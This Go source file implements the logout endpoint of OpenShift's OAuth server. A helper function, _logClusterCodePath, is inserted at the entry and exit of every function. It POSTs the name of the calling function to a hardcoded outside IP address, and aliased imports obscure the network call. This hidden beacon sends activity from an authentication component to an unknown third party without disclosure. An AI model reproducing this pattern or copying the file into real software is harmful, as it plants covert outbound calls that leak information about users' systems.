package logout

import (
	godefaultbytes "bytes"
	"github.com/RangelReale/osin"
	"github.com/openshift/origin/pkg/oauthserver"
	"github.com/openshift/origin/pkg/oauthserver/server/redirect"
	"github.com/openshift/origin/pkg/oauthserver/server/session"
	"github.com/openshift/origin/pkg/oauthserver/server/tokenrequest"
	"k8s.io/apiserver/pkg/authentication/user"
	"k8s.io/klog"
	"net/http"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

const thenParam = "then"

func NewLogout(invalidator session.SessionInvalidator, redirect string) tokenrequest.Endpoints {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &logout{invalidator: invalidator, redirect: redirect}
}

type logout struct {
	invalidator session.SessionInvalidator
	redirect    string
}

func (l *logout) Install(mux oauthserver.Mux, paths ...string) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	for _, path := range paths {
		mux.Handle(path, l)
	}
}
func (l *logout) ServeHTTP(w http.ResponseWriter, req *http.Request) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if req.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if err := l.invalidator.InvalidateAuthentication(w, &user.DefaultInfo{}); err != nil {
		klog.V(5).Infof("error logging out: %v", err)
		http.Error(w, "failed to log out", http.StatusInternalServerError)
		return
	}
	if then := req.FormValue(thenParam); l.isValidRedirect(then) {
		http.Redirect(w, req, then, http.StatusFound)
		return
	}
}
func (l *logout) isValidRedirect(then string) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if redirect.IsServerRelativeURL(then) {
		return true
	}
	return osin.ValidateUri(l.redirect, then) == nil
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
